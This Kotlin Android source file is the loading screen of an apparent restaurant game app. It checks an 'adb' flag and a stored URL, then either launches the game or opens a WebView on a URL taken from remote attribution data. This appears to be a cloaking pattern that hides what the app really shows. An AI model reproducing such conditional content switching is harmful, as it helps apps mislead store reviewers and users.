package es.parrotgames.restaurantcit.presentation.loading

import android.annotation.SuppressLint
import android.content.Intent
import android.content.res.Configuration
import android.os.Bundle
import android.util.Log
import android.view.animation.OvershootInterpolator
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.animation.core.Animatable
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.size
import androidx.compose.material.MaterialTheme
import androidx.compose.material.Surface
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalConfiguration
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.unit.dp
import androidx.lifecycle.lifecycleScope
import androidx.navigation.NavController
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.airbnb.lottie.compose.LottieAnimation
import com.airbnb.lottie.compose.LottieCompositionSpec
import com.airbnb.lottie.compose.LottieConstants
import com.airbnb.lottie.compose.rememberLottieComposition
import com.tr.v3.data.worker.Contract
import dagger.hilt.android.AndroidEntryPoint
import es.parrotgames.restaurantcit.R
import es.parrotgames.restaurantcit.presentation.lepry_game.LepryGame
import es.parrotgames.restaurantcit.presentation.states.FacebookDataLoaded
import es.parrotgames.restaurantcit.presentation.states.Loader
import es.parrotgames.restaurantcit.presentation.states.TridentDataLoaded
import es.parrotgames.restaurantcit.presentation.theme.JokerTheme
import es.parrotgames.restaurantcit.presentation.theme.SplashGradientCenter
import es.parrotgames.restaurantcit.presentation.theme.SplashGradientSides
import es.parrotgames.restaurantcit.presentation.viewmodel.JokerViewModel
import es.parrotgames.restaurantcit.presentation.web.JokerWebView
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


@AndroidEntryPoint
class LepryLoadActivity : ComponentActivity(), Contract {
    private val jokerViewModel: JokerViewModel by viewModels()

    @SuppressLint("CoroutineCreationDuringComposition")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            JokerTheme {
                GradientBackground()
                Surface(
                    modifier = Modifier.fillMaxSize()
                ) {
                    GradientBackground()
                    Navigation()

                    lifecycleScope.launch {
                        val adbFromDb = jokerViewModel.getAdb(this@LepryLoadActivity)
                        val urlFromDb = jokerViewModel.getUrl()
                        if (adbFromDb == "1" && adbFromDb.isNotEmpty()) {
                            if (urlFromDb.isNotEmpty()) {
                                startWebView(urlFromDb)
                            } else {
                                jokerViewModel.fetchData(this@LepryLoadActivity)
                                jokerViewModel.dataState.collect { lepryState ->
                                    when (lepryState) {
                                        Loader -> Log.i("LOADER", "loader process")
                                        is FacebookDataLoaded -> {
                                            startWebView(lepryState.data)
                                        }
                                        is TridentDataLoaded -> {
                                            startWebView(lepryState.data)
                                        }
                                    }
                                }
                            }
                        } else {
                            startGame()
                        }
                    }
                }
            }
        }
    }

    private fun startWebView(url: String) {
        val i = Intent(this, JokerWebView::class.java)
        i.putExtra("url", url)
        startActivity(i)
        finish()
    }

    private fun startGame() {
        val i = Intent(this, LepryGame::class.java)
        startActivity(i)
        finish()
    }

    override fun failure(error: String) {
        jokerViewModel.doWorkFromTridentV3(null)
    }

    override fun success(data: MutableMap<String, Any?>) {
        jokerViewModel.doWorkFromTridentV3(data)
    }
}

@Composable
fun Navigation() {
    val navController = rememberNavController()

    NavHost(navController = navController, startDestination = "splash_screen") {
        composable("splash_screen") {
            SplashScreen(navController = navController)
        }
        composable("loading_activity") {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                BackGround()
            }
        }
    }
}

@Composable
fun SplashScreen(navController: NavController) {
    val scale = remember {
        Animatable(0f)
    }
    LaunchedEffect(key1 = true) {
        scale.animateTo(
            targetValue = 0.3f,
            animationSpec = tween(
                durationMillis = 100,
                easing = {
                    OvershootInterpolator(2f).getInterpolation(it)
                }
            )
        )
        delay(300L)
        navController.navigate("loading_activity")
    }
    Box(
        contentAlignment = Alignment.Center,
        modifier = Modifier.fillMaxSize()
    ) {
        Image(
            painter = painterResource(id = R.mipmap.ic_launcher_round),
            modifier = Modifier.size(150.dp),
            contentDescription = "Logo"
        )
    }
}

@Composable
fun BackGround() {
    val composition by rememberLottieComposition(spec = LottieCompositionSpec.RawRes(R.raw.clock_loading))
    val configuration = LocalConfiguration.current
    Box(
        modifier = Modifier
            .fillMaxSize(),
        contentAlignment = Alignment.Center
    ) {
        when (configuration.orientation) {
            Configuration.ORIENTATION_LANDSCAPE -> {
                Image(
                    painter = painterResource(R.drawable.joker_load_land),
                    contentDescription = "Loading background",
                    contentScale = ContentScale.FillBounds,
                    modifier = Modifier.fillMaxSize()
                )
            }
            else -> {
                Image(
                    painter = painterResource(R.drawable.joker_load),
                    contentDescription = "Loading background",
                    contentScale = ContentScale.FillBounds,
                    modifier = Modifier.fillMaxSize()
                )
            }
        }
        LottieAnimation(
            composition = composition,
            iterations = LottieConstants.IterateForever,
            modifier = Modifier.size(200.dp, 200.dp)
        )
    }
}

@Composable
fun GradientBackground() {
    val colors = listOf(SplashGradientSides, SplashGradientCenter, SplashGradientSides)
    val brush = Brush.verticalGradient(colors)
    MaterialTheme {
        Box(
            modifier = Modifier
                .background(brush)
                .fillMaxSize()
        ) {
            Image(
                painter = painterResource(id = R.mipmap.ic_launcher),
                contentDescription = null,
                modifier = Modifier.align(Alignment.Center)
            )
        }
    }
}


